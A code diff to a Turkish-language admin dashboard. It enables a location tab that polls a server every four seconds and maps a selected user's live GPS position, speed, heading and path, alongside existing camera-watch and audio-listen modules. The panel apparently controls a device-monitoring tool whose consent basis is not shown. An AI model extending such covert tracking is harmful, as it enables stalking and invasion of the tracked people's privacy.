@@ -127,7 +127,7 @@ async function selectUser(uid) {
 let currentModule = 'info';
 
 function switchModule(mod) {
-    if (mod === 'location' || mod === 'storage') return;
+    if (mod === 'storage') return;
     currentModule = mod;
 
     document.querySelectorAll('.module-tab').forEach(t => {
@@ -141,13 +141,23 @@ function switchModule(mod) {
         fetchUserAndShowInfo();
         stopCameraWatch();
         stopAudioListen();
+        stopLocationPoll();
     } else if (mod === 'camera') {
         content.innerHTML = renderModuleCamera();
         startCameraWatch();
         stopAudioListen();
+        stopLocationPoll();
     } else if (mod === 'audio') {
         content.innerHTML = renderModuleAudio();
         stopCameraWatch();
+        stopLocationPoll();
+    } else if (mod === 'location') {
+        content.innerHTML = renderModuleLocation();
+        stopCameraWatch();
+        stopAudioListen();
+        initLocationMap();
+    } else if (mod === 'storage') {
+        return;
     }
 }
 
@@ -188,7 +198,7 @@ function renderUserDetail(container, data) {
             <button class="module-tab active" data-module="info" onclick="switchModule('info')">Bilgi</button>
             <button class="module-tab" data-module="camera" onclick="switchModule('camera')">Kamera</button>
             <button class="module-tab" data-module="audio" onclick="switchModule('audio')">Ses</button>
-            <button class="module-tab disabled" data-module="location" onclick="switchModule('location')">Konum</button>
+            <button class="module-tab" data-module="location" onclick="switchModule('location')">Konum</button>
             <button class="module-tab disabled" data-module="storage" onclick="switchModule('storage')">Depolama</button>
         </div>
         <div id="moduleContent" class="module-content">
@@ -588,6 +598,147 @@ function addSentAudioMessage(seq) {
         <span class="audio-msg-status">Gonderildi</span>
     `;
     list.prepend(item);
+}
+
+// ==================== LOCATION MODULE ====================
+
+let locationMap = null;
+let locationMarker = null;
+let locationPath = null;
+let locationPollTimer = null;
+let leafletLoaded = false;
+
+function renderModuleLocation() {
+    return `
+        <div class="location-viewer">
+            <div class="location-toolbar">
+                <span class="location-status" id="locationStatus">Konum bekleniyor...</span>
+            </div>
+            <div id="locationMapContainer" class="location-map"></div>
+            <div class="location-info-grid">
+                <div class="loc-card">
+                    <span class="loc-label">Enlem</span>
+                    <span class="loc-value" id="locLat">-</span>
+                </div>
+                <div class="loc-card">
+                    <span class="loc-label">Boylam</span>
+                    <span class="loc-value" id="locLng">-</span>
+                </div>
+                <div class="loc-card">
+                    <span class="loc-label">Hassasiyet</span>
+                    <span class="loc-value" id="locAcc">-</span>
+                </div>
+                <div class="loc-card">
+                    <span class="loc-label">Hiz</span>
+                    <span class="loc-value" id="locSpeed">-</span>
+                </div>
+                <div class="loc-card">
+                    <span class="loc-label">Yukseklik</span>
+                    <span class="loc-value" id="locAlt">-</span>
+                </div>
+                <div class="loc-card">
+                    <span class="loc-label">Yon</span>
+                    <span class="loc-value" id="locHeading">-</span>
+                </div>
+            </div>
+        </div>
+    `;
+}
+
+function loadLeaflet(callback) {
+    if (window.L) { callback(); return; }
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
+    document.head.appendChild(link);
+    const script = document.createElement('script');
+    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+    script.onload = callback;
+    document.head.appendChild(script);
+}
+
+function initLocationMap() {
+    loadLeaflet(() => {
+        const container = document.getElementById('locationMapContainer');
+        if (!container) return;
+
+        if (locationMap) {
+            locationMap.invalidateSize();
+            return;
+        }
+
+        locationMap = L.map(container).setView([39.0, 35.0], 6);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap',
+            maxZoom: 19
+        }).addTo(locationMap);
+
+        // Poll for location data
+        startLocationPoll();
+    });
+}
+
+function startLocationPoll() {
+    stopLocationPoll();
+    pollLocation();
+    locationPollTimer = setInterval(pollLocation, 4000);
+}
+
+function stopLocationPoll() {
+    if (locationPollTimer) {
+        clearInterval(locationPollTimer);
+        locationPollTimer = null;
+    }
+}
+
+async function pollLocation() {
+    if (!selectedUid) return;
+    try {
+        const resp = await fetch(`${API_BASE}/api/admin/location/${selectedUid}`, {
+            headers: { 'X-Admin-Token': getAdminToken() }
+        });
+        if (resp.status === 401) { logout(); return; }
+        const data = await resp.json();
+        if (data.status === 'ok' && data.current) {
+            updateLocationUI(data);
+        }
+    } catch {}
+}
+
+function updateLocationUI(data) {
+    const c = data.current;
+    const st = document.getElementById('locationStatus');
+    if (st) st.textContent = 'Guncellendi: ' + new Date().toLocaleTimeString();
+
+    document.getElementById('locLat').textContent = c.lat.toFixed(6);
+    document.getElementById('locLng').textContent = c.lng.toFixed(6);
+    document.getElementById('locAcc').textContent = c.acc ? c.acc.toFixed(1) + ' m' : '-';
+    document.getElementById('locSpeed').textContent = c.speed ? c.speed.toFixed(1) + ' m/s' : '-';
+    document.getElementById('locAlt').textContent = c.alt ? c.alt.toFixed(1) + ' m' : '-';
+    document.getElementById('locHeading').textContent = c.heading ? c.heading.toFixed(1) + '°' : '-';
+
+    // Update map
+    if (locationMap) {
+        const latlng = [c.lat, c.lng];
+
+        if (!locationMarker) {
+            locationMarker = L.marker(latlng).addTo(locationMap);
+            locationMarker.bindPopup('Mevcut Konum');
+        } else {
+            locationMarker.setLatLng(latlng);
+        }
+
+        locationMap.setView(latlng, locationMap.getZoom() || 15);
+
+        // Draw path from all positions
+        if (data.positions && data.positions.length > 1) {
+            const coords = data.positions.map(p => [p.lat, p.lng]);
+            if (locationPath) locationMap.removeLayer(locationPath);
+            locationPath = L.polyline(coords, {
+                color: '#00bcd4', weight: 3, opacity: 0.7
+            }).addTo(locationMap);
+        }
+    }
 }
 
 // ==================== INIT ====================
